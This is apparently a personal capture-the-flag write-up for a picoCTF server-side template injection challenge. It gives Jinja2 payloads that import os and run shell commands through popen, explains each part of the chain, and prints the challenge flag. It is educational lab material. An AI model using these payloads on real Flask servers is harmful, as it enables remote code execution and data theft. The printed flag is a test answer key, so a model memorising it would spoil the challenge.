# SSTI1
Author: Venax


## ğŸ“‚ Category
- Web Exploitation  
- Difficulty: Easy  

---

## ğŸ§© Challenge Description
The challenge provided a simple web form that reflected user input. 

---

## ğŸ” Initial Observations
- Entering expressions like `{{7*7}}` returned `49`, indicating possible Server-Side Template Injection (SSTI).
---

## ğŸ§ª Exploitation Steps

1. Entered: ```{{7*7}}``` â†’ Response was `49` â†’ Confirmed SSTI.
2. Tried: ```{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}```
3. Got a system-level response confirming Remote Code Execution (RCE).
4. Ran: ```{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}```
5. Server files listed.
6. Finally: ```{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}```
7. Revealed the flag.

---

## ğŸ Flag

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_424a1494}

---

## ğŸ§  What I Learned

**What is a Template Engine?**

A template engine helps generate dynamic web pages. Instead of hardcoding values, you write placeholders like:

```<p>Hello, {{ name }}!</p>```

The server fills in the actual data.

In this challenge, the web page uses Jinja2, the default template engine for Python's Flask framework, to make the page dynamic. Different frameworks use different engines and syntax. For example, if the site was built with Django, an expression like ```{{7}}``` might be enough to test for evaluation.

**What is SSTI?**

Server-Side Template Injection occurs when user input is unsafely inserted into a template. If an input like ```{{7*7}}``` returns 49 (7 times 7 = 49), the server is evaluating user input as code.

**Note:** 7\*7 is just a common conventionâ€”it could be any expression.

If unpatched, SSTI can lead to:
- Data leaks
- Remote code execution (RCE)
- Full server compromise

**Code explanation**

```{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}```

- ```request```	: A Flask object representing the current HTTP request.
- ```request.application``` : The Flask application instance being used.
- ```__globals__```: Accesses the global variables of the templateâ€™s underlying Python environment.
- ```__builtins__``` : Exposes all built-in Python functions and objects (like open, print, __import__, etc.).
- ```__import__('os')``` : Dynamically imports the os module â€” a powerful module for interacting with the system.
- ```.popen('id')``` : Runs the shell command id, which returns the current user and group info. Can replace with other commands (eg: ls, cat, etc)
- ```.read()``` : Reads and returns the output of that command.

---

## ğŸ“š References

https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
